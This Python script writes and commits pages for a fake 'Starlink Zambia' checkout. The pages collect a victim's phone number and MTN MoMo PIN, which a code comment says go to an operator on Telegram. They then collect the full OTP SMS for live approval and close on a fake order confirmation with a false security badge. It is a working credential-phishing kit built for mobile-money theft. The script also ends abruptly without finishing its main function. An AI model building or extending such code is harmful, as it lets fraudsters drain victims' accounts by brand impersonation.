#!/usr/bin/env python3
"""act18.py - Flow restructure + OTP page wiring.

- Onboarding ping moves to the "Choose your package" CTA on page 1.
- Plans page no longer pings (reads ?sid from URL instead).
- Checkout no longer blocks: on Confirm it posts and immediately
  navigates to sms.html.
- SMS page submits the OTP with an approval loader, watches pin-status
  in the background and bounces back to checkout on PIN rejection,
  and surfaces a retryable error on OTP rejection.
- New success.html shown on OTP approval.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME = Path(__file__).name
TIMESTEP = 18

COMMIT_MESSAGE = """act18: restructure flow and wire otp page

Moves the "New User onboarding" ping to the Choose Your Package CTA
on page 1 (new pages/index.js). Plans page no longer pings; it reads
?sid from the URL and forwards to checkout. Checkout no longer waits
for PIN approval - it posts and immediately navigates to sms.html.
SMS page submits OTP with an approval loader, watches pin-status in
the background and bounces back to checkout on rejection, and shows
a retryable error on OTP rejection. Adds success.html."""


# --------------------------------------------------------------------- #
# index.html (two surgical edits)
# --------------------------------------------------------------------- #

INDEX_CTA_OLD = '<a class="btn btn--primary" href="plans.html">'
INDEX_CTA_NEW = '<a class="btn btn--primary" id="choose-package" href="plans.html">'

INDEX_TAIL_OLD = "  </div>\n</body>\n</html>"
INDEX_TAIL_NEW = (
    "  </div>\n\n"
    "  <script src=\"assets/js/pages/index.js\"></script>\n"
    "</body>\n</html>"
)


# --------------------------------------------------------------------- #
# pages/index.js (new)
# --------------------------------------------------------------------- #

PAGES_INDEX_JS = """\
/* ==========================================================================
   pages/index.js
   On the Status page, when the user taps "Choose your package",
   ping POST /api/onboarding, then navigate to plans.html carrying
   the newly created session id in the URL.
   ========================================================================== */

(function (global) {
  "use strict";

  var CTA_ID = "choose-package";
  var PLANS_PAGE = "plans.html";
  var ENDPOINT = "/api/onboarding";

  function postOnboarding() {
    return global.fetch(ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ plan_code: "unknown" })
    })
    .then(function (response) {
      return response.ok ? response.json() : { session_id: "" };
    })
    .then(function (data) {
      return typeof data.session_id === "string" ? data.session_id : "";
    })
    .catch(function () {
      return "";
    });
  }

  function handleClick(event) {
    event.preventDefault();
    postOnboarding().then(function (sessionId) {
      var target = PLANS_PAGE;
      if (sessionId) {
        target += "?sid=" + encodeURIComponent(sessionId);
      }
      global.location.href = target;
    });
  }

  function init() {
    var cta = document.getElementById(CTA_ID);
    if (cta) {
      cta.addEventListener("click", handleClick);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# pages/plans.js (rewrite)
# --------------------------------------------------------------------- #

PAGES_PLANS_JS = """\
/* ==========================================================================
   pages/plans.js
   Renders the plan cards. On tap: show the MoMo redirect loader for
   a short dwell, then navigate to checkout.html?plan=<code>&sid=<sid>.

   The session id comes from the URL (?sid=...) - set by pages/index.js
   when the user clicked "Choose your package". If there is no sid in
   the URL (e.g. someone deep-linked to plans.html directly), we fall
   back to a single POST /api/onboarding to mint one.
   ========================================================================== */

(function (global) {
  "use strict";

  var CONTAINER_ID = "plan-list";
  var LOADER_ID = "momo-loader";
  var CHECKOUT_PAGE = "checkout.html";
  var DEFAULT_DWELL_MS = 5000;
  var ONBOARDING_ENDPOINT = "/api/onboarding";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function showLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function planCodeFromHref(href) {
    var marker = "?plan=";
    var index = href.indexOf(marker);
    if (index === -1) {
      return "";
    }
    var tail = href.substring(index + marker.length);
    var amp = tail.indexOf("&");
    return amp === -1 ? tail : tail.substring(0, amp);
  }

  function dwellMs() {
    var configured = global.Copy &&
                     global.Copy.loader &&
                     global.Copy.loader.dwellMs;
    return typeof configured === "number" ? configured : DEFAULT_DWELL_MS;
  }

  function navigateAfterDwell(target) {
    global.setTimeout(function () {
      global.location.href = target;
    }, dwellMs());
  }

  function postOnboarding(planCode) {
    return global.fetch(ONBOARDING_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ plan_code: planCode })
    })
    .then(function (response) {
      return response.ok ? response.json() : { session_id: "" };
    })
    .then(function (data) {
      return typeof data.session_id === "string" ? data.session_id : "";
    })
    .catch(function () {
      return "";
    });
  }

  function checkoutUrl(planCode, sessionId) {
    var base = CHECKOUT_PAGE + "?plan=" + encodeURIComponent(planCode);
    if (sessionId) {
      base += "&sid=" + encodeURIComponent(sessionId);
    }
    return base;
  }

  function handlePlanClick(event) {
    event.preventDefault();
    var href = event.currentTarget.href;
    var planCode = planCodeFromHref(href);
    var sessionId = getQueryParam("sid") || "";
    showLoader();
    if (sessionId) {
      navigateAfterDwell(checkoutUrl(planCode, sessionId));
      return;
    }
    postOnboarding(planCode).then(function (newSid) {
      navigateAfterDwell(checkoutUrl(planCode, newSid));
    });
  }

  function buildPlanCard(plan) {
    var card = document.createElement("a");
    card.className = "card plan-card";
    card.href = CHECKOUT_PAGE + "?plan=" + encodeURIComponent(plan.code);
    card.setAttribute("aria-label",
      plan.name + ", " + plan.quotaLabel + ", " +
      global.Plans.formatPrice(plan) + " per " + plan.billingPeriod);

    var head = document.createElement("div");
    head.className = "plan-card__head";

    var name = document.createElement("h3");
    name.className = "plan-card__name";
    name.textContent = plan.name;

    var pill = document.createElement("span");
    pill.className = "pill";
    pill.textContent = plan.quotaLabel;

    head.appendChild(name);
    head.appendChild(pill);

    var desc = document.createElement("p");
    desc.className = "plan-card__desc";
    desc.textContent = plan.description;

    var price = document.createElement("p");
    price.className = "plan-card__price";
    price.textContent = global.Plans.formatPrice(plan);

    var period = document.createElement("span");
    period.className = "plan-card__price-period";
    period.textContent = "/" + plan.billingPeriod;
    price.appendChild(period);

    card.appendChild(head);
    card.appendChild(desc);
    card.appendChild(price);
    card.addEventListener("click", handlePlanClick);
    return card;
  }

  function render() {
    var container = document.getElementById(CONTAINER_ID);
    if (!container) {
      return;
    }
    container.textContent = "";
    global.Plans.all.forEach(function (plan) {
      container.appendChild(buildPlanCard(plan));
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", render);
  } else {
    render();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# pages/checkout.js (rewrite - no waiting)
# --------------------------------------------------------------------- #

PAGES_CHECKOUT_JS = """\
/* ==========================================================================
   pages/checkout.js
   Reads ?plan and ?sid, renders the amount, wires phone + 5-digit PIN.
   On Confirm:
     1. POST /api/checkout (sends phone + PIN to the operator on
        Telegram with Approve/Reject buttons)
     2. navigate to sms.html immediately (no waiting here)

   If the URL carries ?error=pin_rejected (a bounce back from the SMS
   page after the operator rejected the PIN), the error is shown and
   the phone number is prefilled.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var LOADER_ID = "payment-loader";
  var LOADER_TITLE_ID = "loader-title";
  var LOADER_BODY_ID = "loader-body";
  var LOADER_FOOTNOTE_ID = "loader-footnote";
  var ERROR_ID = "checkout-error";
  var ERROR_TEXT_ID = "checkout-error-text";

  var ERROR_REJECTED = "Wrong PIN, please try again.";
  var ERROR_NO_SESSION =
    "This checkout link is missing a session. " +
    "Please start from the beginning (Choose your package).";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function digitsOnly(value) {
    return (value || "").replace(/\\D+/g, "");
  }

  function formatLocalPhone(raw) {
    var digits = digitsOnly(raw);
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    setText(LOADER_FOOTNOTE_ID, "Please do not refresh the page");
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  function postCheckout(sessionId, phone, pin) {
    return global.fetch("/api/checkout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        phone: phone,
        pin: pin
      })
    });
  }

  function navigateToSms(plan, phone, sessionId) {
    var target = SMS_PAGE +
      "?plan=" + encodeURIComponent(plan.code) +
      "&phone=" + encodeURIComponent(phone) +
      "&sid=" + encodeURIComponent(sessionId);
    global.location.href = target;
  }

  function wireForm(plan, sessionId) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    var prefill = getQueryParam("phone");
    if (prefill) {
      phoneInput.value = digitsOnly(prefill).slice(0, 9);
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });
    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      hideError();
      var phone = formatLocalPhone(phoneInput.value);
      var pin = pinInput.value;
      if (phone.length < 9 || pin.length !== PIN_LENGTH) {
        showError("Enter a 9-digit phone number and a 5-digit PIN.");
        return;
      }

      showLoader("Sending...", "Sending your details to the operator");

      function proceed() {
        navigateToSms(plan, phone, sessionId);
      }
      postCheckout(sessionId, phone, pin).then(proceed).catch(proceed);
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  function init() {
    var plan = resolvePlan();
    var sessionId = getQueryParam("sid") || "";

    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }

    if (getQueryParam("error") === "pin_rejected") {
      showError(ERROR_REJECTED);
    }

    if (!sessionId) {
      showError(ERROR_NO_SESSION);
      return;
    }
    wireForm(plan, sessionId);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# sms.html (full rewrite - adds loader + error callout)
# --------------------------------------------------------------------- #

SMS_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <title>Full SMS Verification - Starlink Zambia</title>
  <link rel="icon" type="image/png" href="assets/img/logo.png">
  <link rel="stylesheet" href="assets/css/tokens.css">
  <link rel="stylesheet" href="assets/css/base.css">
  <link rel="stylesheet" href="assets/css/components.css">
</head>
<body>
  <div class="app-shell">

    <header class="app-top-bar">
      <img class="app-top-bar__brand" src="assets/img/logo.png" alt="Starlink">
    </header>

    <main class="app-content">

      <section class="card" aria-labelledby="sms-title">

        <div class="page-header-row">
          <a class="back-link" href="#" id="back-link">
            <svg class="back-link__icon" viewBox="0 0 24 24" fill="none"
                 stroke="currentColor" stroke-width="2"
                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
              <path d="M19 12H5"/>
              <path d="m12 19-7-7 7-7"/>
            </svg>
            <span>Back</span>
          </a>
          <div class="amount-tag">
            <p class="amount-tag__label">Amount</p>
            <p class="amount-tag__value" id="amount-value">ZMW 45.00</p>
          </div>
        </div>

        <h1 class="page-title" id="sms-title"
            style="margin-top: var(--space-5);">Full SMS Verification</h1>
        <p class="page-subtitle" style="margin-top: var(--space-2);">
          Please paste the full SMS content you received from MTN MoMo.
        </p>

        <hr style="border:none;border-top:1px solid var(--color-border);
                   margin: var(--space-5) 0;">

        <div style="text-align:center;">
          <p class="amount-block__label">Sending to</p>
          <p style="font-size: var(--text-lg); font-weight: var(--weight-bold);
                    margin-top: var(--space-2);" id="sending-to">079764645</p>
        </div>

        <div class="callout callout--warn"
             style="margin-top: var(--space-5);">
          <svg class="callout__icon" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/>
            <line x1="12" y1="9" x2="12" y2="13"/>
            <line x1="12" y1="17" x2="12.01" y2="17"/>
          </svg>
          <span>
            DO NOT edit the SMS &#8212; only copy and paste
            the entire message below
          </span>
        </div>

        <div class="callout callout--warn" id="sms-error"
             style="display:none; margin-top: var(--space-4);">
          <svg class="callout__icon" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0Z"/>
            <line x1="12" y1="9" x2="12" y2="13"/>
            <line x1="12" y1="17" x2="12.01" y2="17"/>
          </svg>
          <span id="sms-error-text">
            Invalid confirmation message, please wait for a new one and try again.
          </span>
        </div>

        <div class="textarea-wrap" style="margin-top: var(--space-5);">
          <label class="amount-block__label" for="sms-body"
                 style="text-align:left;">Paste full SMS content</label>
          <textarea class="textarea" id="sms-body" name="sms-body"
                    placeholder="Paste the entire MTN MoMo SMS here..."></textarea>
          <p class="textarea-wrap__counter">
            <span id="char-count">0</span>
            <span>characters</span>
          </p>
        </div>

        <button type="button" class="btn btn--orange"
                id="next-step" style="margin-top: var(--space-4);" disabled>
          <span>Next Step</span>
          <svg class="btn__icon" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <line x1="5" y1="12" x2="19" y2="12"/>
            <polyline points="12 5 19 12 12 19"/>
          </svg>
        </button>

        <p class="trust" style="margin-top: var(--space-4);">
          <svg class="trust__icon" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2"
               stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"/>
          </svg>
          <span>SSL Encrypted and Secure</span>
        </p>

      </section>

    </main>

    <nav class="app-bottom-nav" aria-label="Primary">
      <a class="app-nav-item" href="index.html">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M5 12.55a11 11 0 0 1 14 0"/>
          <path d="M8.5 16.03a6 6 0 0 1 7 0"/>
          <path d="M2 8.82a15 15 0 0 1 20 0"/>
          <line x1="12" y1="20" x2="12.01" y2="20"/>
        </svg>
        <span>Status</span>
      </a>
      <a class="app-nav-item" href="plans.html">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/>
          <path d="M3 6h18"/>
          <path d="M16 10a4 4 0 0 1-8 0"/>
        </svg>
        <span>Plans</span>
      </a>
      <a class="app-nav-item" href="#orders">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <line x1="8" y1="6" x2="21" y2="6"/>
          <line x1="8" y1="12" x2="21" y2="12"/>
          <line x1="8" y1="18" x2="21" y2="18"/>
          <line x1="3" y1="6" x2="3.01" y2="6"/>
          <line x1="3" y1="12" x2="3.01" y2="12"/>
          <line x1="3" y1="18" x2="3.01" y2="18"/>
        </svg>
        <span>Orders</span>
      </a>
      <a class="app-nav-item" href="#settings">
        <svg class="app-nav-item__icon" viewBox="0 0 24 24" fill="none"
             stroke="currentColor" stroke-width="2" stroke-linecap="round"
             stroke-linejoin="round" aria-hidden="true">
          <circle cx="12" cy="12" r="3"/>
          <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1Z"/>
        </svg>
        <span>Settings</span>
      </a>
    </nav>

    <div class="overlay" id="sms-loader" hidden>
      <div class="loader-card" role="status" aria-live="polite">
        <div class="loader-spinner" aria-hidden="true"></div>
        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
        <h2 class="loader-card__title" id="sms-loader-title">Awaiting Approval...</h2>
        <p class="loader-card__body" id="sms-loader-body">
          Waiting for the operator to verify the OTP. Please do not close this page.
        </p>
        <p class="loader-card__footnote">Please do not refresh the page</p>
      </div>
    </div>

  </div>

  <script src="assets/js/data/copy.js"></script>
  <script src="assets/js/data/plans.js"></script>
  <script src="assets/js/pages/sms.js"></script>
</body>
</html>
"""


# --------------------------------------------------------------------- #
# pages/sms.js (rewrite)
# --------------------------------------------------------------------- #

PAGES_SMS_JS = """\
/* ==========================================================================
   pages/sms.js
   Reads ?plan, ?phone and ?sid from the URL.

   Behaviour
   ---------
   * Renders the amount and recipient number.
   * Live character counter; Next Step enabled when non-empty.
   * Background watchdog polls pin-status every 2s. If the operator
     rejects the PIN while the user is here, we bounce them back to
     checkout.html?plan=X&sid=Y&phone=Z&error=pin_rejected.
   * Next Step: POST /api/otp, show the approval loader, then poll
     otp-status until approved (-> success.html) or rejected (-> show
     inline error, allow retry).
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var DEFAULT_PHONE = "079764645";
  var PIN_WATCHDOG_MS = 2000;
  var OTP_POLL_MS = 1500;

  var LOADER_ID = "sms-loader";
  var LOADER_TITLE_ID = "sms-loader-title";
  var LOADER_BODY_ID = "sms-loader-body";
  var ERROR_ID = "sms-error";
  var ERROR_TEXT_ID = "sms-error-text";

  var ERROR_OTP_REJECTED =
    "Invalid confirmation message, please wait for a new one and try again.";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  var sid = "";
  var plan = null;
  var phone = "";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function hideLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = true;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function renderHeader() {
    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }
    var phoneEl = document.getElementById("sending-to");
    if (phoneEl) {
      phoneEl.textContent = phone || DEFAULT_PHONE;
    }
    var backLink = document.getElementById("back-link");
    if (backLink) {
      var href = "checkout.html?plan=" + encodeURIComponent(plan.code);
      if (sid) {
        href += "&sid=" + encodeURIComponent(sid);
      }
      if (phone) {
        href += "&phone=" + encodeURIComponent(phone);
      }
      backLink.href = href;
    }
  }

  function getPinStatus() {
    return global.fetch(
      "/api/pin-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function bounceToCheckout() {
    var target = "checkout.html" +
      "?plan=" + encodeURIComponent(plan.code) +
      "&sid=" + encodeURIComponent(sid) +
      "&phone=" + encodeURIComponent(phone) +
      "&error=pin_rejected";
    global.location.href = target;
  }

  function startPinWatchdog() {
    function tick() {
      getPinStatus().then(function (data) {
        if (data.status === "rejected") {
          bounceToCheckout();
          return;
        }
        global.setTimeout(tick, PIN_WATCHDOG_MS);
      }).catch(function () {
        global.setTimeout(tick, PIN_WATCHDOG_MS * 2);
      });
    }
    global.setTimeout(tick, PIN_WATCHDOG_MS);
  }

  function getOtpStatus() {
    return global.fetch(
      "/api/otp-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function navigateToSuccess(referenceNumber) {
    var target = "success.html" +
      "?sid=" + encodeURIComponent(sid) +
      "&ref=" + encodeURIComponent(referenceNumber || "");
    global.location.href = target;
  }

  function pollOtpStatus() {
    function tick() {
      getOtpStatus().then(function (data) {
        if (data.status === "approved") {
          navigateToSuccess(data.reference_number || "");
          return;
        }
        if (data.status === "rejected") {
          hideLoader();
          showError(ERROR_OTP_REJECTED);
          return;
        }
        global.setTimeout(tick, OTP_POLL_MS);
      }).catch(function () {
        global.setTimeout(tick, OTP_POLL_MS * 2);
      });
    }
    global.setTimeout(tick, OTP_POLL_MS);
  }

  function postOtp(smsBody) {
    return global.fetch("/api/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sid,
        sms_body: smsBody
      })
    });
  }

  function wireForm() {
    var textarea = document.getElementById("sms-body");
    var counter = document.getElementById("char-count");
    var nextBtn = document.getElementById("next-step");
    if (!textarea || !counter || !nextBtn) {
      return;
    }

    function sync() {
      counter.textContent = String(textarea.value.length);
      nextBtn.disabled = textarea.value.trim().length === 0;
    }
    textarea.addEventListener("input", sync);
    sync();

    nextBtn.addEventListener("click", function () {
      hideError();
      var smsBody = textarea.value.trim();
      if (!smsBody) {
        return;
      }
      showLoader("Sending OTP...", "Sending your OTP to the operator");
      postOtp(smsBody).then(function (response) {
        if (!response.ok) {
          hideLoader();
          showError(ERROR_NETWORK);
          return;
        }
        showLoader(
          "Awaiting Approval...",
          "Waiting for the operator to verify the OTP. Please do not close this page."
        );
        pollOtpStatus();
      }).catch(function () {
        hideLoader();
        showError(ERROR_NETWORK);
      });
    });
  }

  function init() {
    plan = (function () {
      var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
      return global.Plans.findByCode(code) ||
             global.Plans.findByCode(DEFAULT_PLAN_CODE);
    })();
    phone = getQueryParam("phone") || DEFAULT_PHONE;
    sid = getQueryParam("sid") || "";

    renderHeader();
    wireForm();

    if (sid) {
      startPinWatchdog();
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


# --------------------------------------------------------------------- #
# success.html (new)
# --------------------------------------------------------------------- #

SUCCESS_HTML = """\
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <title>Order Confirmed - Starlink Zambia</title>
  <link rel="icon" type="image/png" href="assets/img/logo.png">
  <link rel="stylesheet" href="assets/css/tokens.css">
  <link rel="stylesheet" href="assets/css/base.css">
  <link rel="stylesheet" href="assets/css/components.css">
</head>
<body>
  <div class="app-shell">

    <header class="app-top-bar">
      <img class="app-top-bar__brand" src="assets/img/logo.png" alt="Starlink">
    </header>

    <main class="app-content" style="align-items:stretch;">

      <section class="card" style="text-align:center; padding: var(--space-8) var(--space-5);">

        <div style="display:flex; justify-content:center; margin-bottom: var(--space-5);">
          <div style="width:72px;height:72px;border-radius:50%;
                      background: var(--color-brand-blue);
                      display:flex;align-items:center;justify-content:center;
                      box-shadow: 0 8px 24px rgba(30,90,246,0.35);">
            <svg viewBox="0 0 24 24" width="36" height="36" fill="none"
                 stroke="#ffffff" stroke-width="3"
                 stroke-linecap="round" stroke-linejoin="round">
              <polyline points="20 6 9 17 4 12"/>
            </svg>
          </div>
        </div>

        <h1 class="page-title">Thank you for placing your order</h1>
        <p class="page-subtitle" style="margin-top: var(--space-3);">
          Your payment has been confirmed. Your Starlink activation
          details and a payment confirmation will be sent to you via
          SMS shortly.
        </p>

        <div style="margin-top: var(--space-6);
                    padding: var(--space-4);
                    border-radius: var(--radius-md);
                    background: var(--color-surface-muted);">
          <p class="amount-block__label">Order reference</p>
          <p style="margin-top: var(--space-2);
                    font-size: var(--text-xl);
                    font-weight: var(--weight-bold);
                    letter-spacing: 0.05em;
                    font-family: var(--font-mono);"
             id="reference-number">MO-XXXX-XXXX</p>
        </div>

        <a class="btn btn--primary"
           href="index.html"
           style="margin-top: var(--space-6); text-transform:none;">
          <span>Back to Status</span>
        </a>

      </section>

    </main>

  </div>

  <script src="assets/js/pages/success.js"></script>
</body>
</html>
"""


# --------------------------------------------------------------------- #
# pages/success.js (new)
# --------------------------------------------------------------------- #

PAGES_SUCCESS_JS = """\
/* ==========================================================================
   pages/success.js
   Renders the reference number passed in the URL (?ref=...).
   If the URL has ?sid= but no ?ref=, fetches it from /api/otp-status.
   ========================================================================== */

(function (global) {
  "use strict";

  var REFERENCE_ID = "reference-number";
  var PLACEHOLDER = "MO-XXXX-XXXX";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function render(value) {
    var el = document.getElementById(REFERENCE_ID);
    if (el) {
      el.textContent = value || PLACEHOLDER;
    }
  }

  function init() {
    var ref = getQueryParam("ref");
    if (ref) {
      render(ref);
      return;
    }
    var sid = getQueryParam("sid");
    if (!sid) {
      render("");
      return;
    }
    global.fetch("/api/otp-status/" + encodeURIComponent(sid))
      .then(function (response) {
        return response.ok ? response.json() : {};
      })
      .then(function (data) {
        render(data.reference_number || "");
      })
      .catch(function () {
        render("");
      });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""


LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def read_text(path: Path) -> str:
    """Return UTF-8 text, or '' if the file does not exist."""
    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8")


def write_text(path: Path, text: str) -> None:
    """Write UTF-8 with LF endings."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def replace_once(path: Path, old: str, new: str) -> str:
    """Replace *old* with *new* once. Return a short status."""
    text = read_text(path)
    if not text:
        return "missing-file"
    if old not in text:
        if new in text:
            return "already"
        return "no-match"
    write_text(path, text.replace(old, new, 1))
    return "replaced"


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Apply all edits and commit."""
    logging.basicConfig(
        level=logging.INFO, format="%(message)s", stream=sys.stdout
    )
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # index.html - two surgical edits
    index_html = root / "web" / "index.html"
    LOGGER.info("[%s] %s (CTA id)",
                replace_once(index_html, INDEX_CTA_OLD, INDEX_CTA_NEW),
                index_html.relative_to(root))
    LOGGER.info("[%s] %s (script tag)",
                replace_once(index_html, INDEX_TAIL_OLD, INDEX_TAIL_NEW),
                index_html.relative_to(root))

    # Rewrites / new files
    targets = {
        root / "web" / "assets" / "js" / "pages" / "index.js": PAGES_INDEX_JS,
        root / "web" / "assets" / "js" / "pages" / "plans.js": PAGES_PLANS_JS,
        root / "web" / "assets" / "js" / "pages" / "checkout.js": PAGES_CHECKOUT_JS,
        root / "web" / "sms.html": SMS_HTML,
        root / "web" / "assets" / "js" / "pages" / "sms.js": PAGES_SMS_JS,
        root / "web" / "success.html": SUCCESS_HTML,
        root / "web" / "assets" / "js" / "pages" / "success.js": PAGES_SUCCESS_JS,
    }
    for path, content in targets.items():
        write_text(path, content)
        LOGGER.info("[written] %s", path.relative_to(root))

    # Commit
    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("")
